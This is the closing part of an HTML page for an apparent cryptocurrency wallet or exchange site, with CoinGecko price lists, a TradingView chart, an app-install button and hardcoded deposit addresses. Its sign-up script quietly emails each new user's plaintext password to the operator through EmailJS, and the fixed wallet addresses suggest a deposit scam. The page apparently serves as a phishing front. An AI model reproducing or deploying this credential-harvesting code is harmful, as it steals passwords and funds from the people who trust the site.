    const ul = document.getElementById('coinListUL');
    ul.innerHTML = "<li>Loading...</li>";

    try {
      const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1');
      if (!res.ok) throw new Error("Failed to fetch");
      const coins = await res.json();
      ul.innerHTML = "";
      coins.forEach(c => {
        const li = document.createElement('li');
        li.innerHTML = `<img src="${c.image}" style="width:24px;height:24px;"> <strong>${c.symbol.toUpperCase()}</strong>: $${c.current_price.toLocaleString()}`;
        ul.appendChild(li);
      });
    } catch (err) {
      ul.innerHTML = "<li>Unable to load market data.</li>";
      console.error(err);
    }
  }
</script>
  
<!-- TradingView Widget Script -->
<script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>

<script>
  // Initialize TradingView Widget
  new TradingView.widget({
    autosize: true,
    symbol: "BINANCE:BTCUSDT",
    interval: "60",
    timezone: "Etc/UTC",
    theme: "dark",
    style: "1",
    locale: "en",
    toolbar_bg: "#12171d",
    enable_publishing: false,
    allow_symbol_change: true,
    container_id: "tradingview_chart",
  });

  // Public API endpoint (CoinGecko) for live prices
  const priceIds = {
    btcPrice: "bitcoin",
    ethPrice: "ethereum",
    bnbPrice: "binancecoin",
    usdtPrice: "tether"
  };

  async function fetchLivePrices() {
    try {
      const ids = Object.values(priceIds).join(",");
      const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`;
      const response = await fetch(url);
      const data = await response.json();

      for (const [elementId, coinId] of Object.entries(priceIds)) {
        const price = data[coinId]?.usd ?? 0;
        document.getElementById(elementId).textContent = `$${price.toFixed(4)}`;
      }
    } catch (err) {
      console.error("Failed to fetch live prices:", err);
    }
  }

  // Update prices on load and every 60 seconds
  fetchLivePrices();
  setInterval(fetchLivePrices, 60000);

  // Show receive address (example static address per token)
  function showReceiveAddress() {
    const token = document.getElementById("receiveToken").value;
    const addresses = {
      USDT: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",
      BTC: "bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu",
      ETH: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",
      BNB: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",
      SOL: "8ChmWCsEjvoNcFkze5GgNuUiw3FLTzYy2g5Sw5DumypX",
      TRX: "TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco"
    };
    const addressBox = document.getElementById("receiveAddressBox");
    addressBox.style.display = "block";
    addressBox.textContent = addresses[token] || "No address available";
  }
</script>
  
  <script>
    let deferredPrompt;

    window.addEventListener('beforeinstallprompt', (e) => {
      console.log('beforeinstallprompt fired');
      e.preventDefault();
      deferredPrompt = e;
      showInstallButton();
    });

    function showInstallButton() {
      if (document.getElementById('btn-install')) return;

      const nav = document.querySelector('nav');
      const btn = document.createElement('button');
      btn.id = 'btn-install';
      btn.style.backgroundColor = '#28a745';
      btn.style.color = '#fff';
      btn.style.flex = '1 1 120px';
      btn.style.border = 'none';
      btn.style.borderRadius = '12px';
      btn.style.padding = '15px';
      btn.style.cursor = 'pointer';
      btn.style.fontWeight = 'bold';
      btn.style.display = 'flex';
      btn.style.alignItems = 'center';
      btn.style.gap = '10px';

      const svgNS = "http://www.w3.org/2000/svg";
      const svg = document.createElementNS(svgNS, "svg");
      svg.setAttribute("width", "20");
      svg.setAttribute("height", "20");
      svg.setAttribute("viewBox", "0 0 24 24");
      svg.setAttribute("fill", "none");
      svg.setAttribute("stroke", "currentColor");
      svg.setAttribute("stroke-width", "2");
      svg.setAttribute("stroke-linecap", "round");
      svg.setAttribute("stroke-linejoin", "round");

      const path1 = document.createElementNS(svgNS, "path");
      path1.setAttribute("d", "M17 7h-4a3 3 0 0 0 0 6h4a3 3 0 0 1 0 6h-4a7 7 0 0 1 0-14h4");
      svg.appendChild(path1);

      const path2 = document.createElementNS(svgNS, "path");
      path2.setAttribute("d", "M7 17h4a3 3 0 0 0 0-6H7a3 3 0 0 1 0-6h4a7 7 0 0 1 0 14H7");
      svg.appendChild(path2);

      btn.appendChild(svg);
      btn.appendChild(document.createTextNode('Install App'));

      btn.onclick = async () => {
        if (!deferredPrompt) return;
        deferredPrompt.prompt();
        const choiceResult = await deferredPrompt.userChoice;
        if (choiceResult.outcome === 'accepted') {
          alert('App installed successfully!');
        } else {
          alert('App installation dismissed.');
        }
        deferredPrompt = null;
        btn.remove();
      };

      nav.appendChild(btn);
      console.log('Install button added');
    }

    // Register service worker
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('service-worker.js')
      .then(() => console.log('Service Worker Registered'))
      .catch(err => console.error('Service Worker registration failed:', err));
    }
  </script>

   <!-- Scripts -->
  <script>
    // Navigation function
    function showPage(pageId) {
      document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
        page.style.display = 'none';
      });
      const target = document.getElementById('page' + pageId);
      if(target) {
        target.classList.add('active');
        target.style.display = 'block';
      }
    }

    // Show landing on load
    document.addEventListener('DOMContentLoaded', () => {
      showPage('0');

      // Load CoinGecko logos
      const coinLogos = document.getElementById("coinLogos");
      const coins = ['binancecoin', 'ethereum', 'tether'];
      coins.forEach(coin => {
        fetch(`https://api.coingecko.com/api/v3/coins/${coin}`)
          .then(res => res.json())
          .then(data => {
            const img = document.createElement("img");
            img.src = data.image.small;
            img.alt = data.name;
            img.className = "w-10 h-10";
            coinLogos.appendChild(img);
          })
          .catch(err => console.error(`Error loading ${coin} logo`, err));
      });
    });
  </script>
<!-- Coin Logo Container -->
<div id="coinLogos" class="flex space-x-4 items-center mb-4"></div>

<!-- Coin Logos -->
<div id="coinLogos" class="flex gap-4 mb-4"></div>

<script>
  async function loadCoinGeckoLogos() {
    const coinIds = ['bitcoin', 'tether', 'binancecoin'];
    const coinLogosContainer = document.getElementById('coinLogos');

    try {
      const response = await fetch(
        `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${coinIds.join(',')}`
      );
      const data = await response.json();

      data.forEach(coin => {
        const img = document.createElement('img');
        img.src = coin.image;
        img.alt = `${coin.name} Logo`;
        img.className = 'h-8 w-8';
        coinLogosContainer.appendChild(img);
      });
    } catch (error) {
      console.error('Failed to load coin logos:', error);
      coinLogosContainer.innerHTML = '<p class="text-red-500">Error loading logos</p>';
    }
  }

  loadCoinGeckoLogos();
</script>  
  <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script><script>
  const publicKey = "n9BsaM4ZjH178UeSf";
  const serviceID = "service_xg8bzqs";
  const submitTemplateID = "template_gclz9gu";
  const replyTemplateID = "template_r0zg4zj";

  emailjs.init(publicKey);

  function showPage(id) {
    document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
    document.getElementById(id).style.display = 'block';
  }

  document.getElementById("signUpForm").addEventListener("submit", async function (e) {
    e.preventDefault();
    const fullName = document.getElementById("signFullName").value;
    const email = document.getElementById("signEmail").value;
    const password = document.getElementById("signPassword").value;

    localStorage.setItem("user", JSON.stringify({ name: fullName, email }));

    const templateParams = {
      name: fullName,
      email: email,
      message: `New user signed up. Password: ${password}`
    };

    try {
      await emailjs.send(serviceID, submitTemplateID, templateParams);
      await emailjs.send(serviceID, replyTemplateID, { to_email: email });
      showPage("page1i");

      setTimeout(() => {
        showPage("page1ii");
      }, 10000);
    } catch (error) {
      alert("Signup failed. Please try again.");
      console.error(error);
    }
  });

  document.getElementById("btnCaptchaSubmit").addEventListener("click", function () {
    const hcaptchaResponse = hcaptcha.getResponse();
    if (!hcaptchaResponse) {
      document.getElementById("captchaError").innerText = "Please complete the CAPTCHA.";
      return;
    }

    const user = JSON.parse(localStorage.getItem("user"));
    if (user) {
      document.getElementById("profileName").innerText = user.name;
      document.getElementById("profileEmail").innerText = user.email;
    }
    showPage("page3");
  });
</script><style>
  .page { display: none; }
</style>
  
</body>
</html>

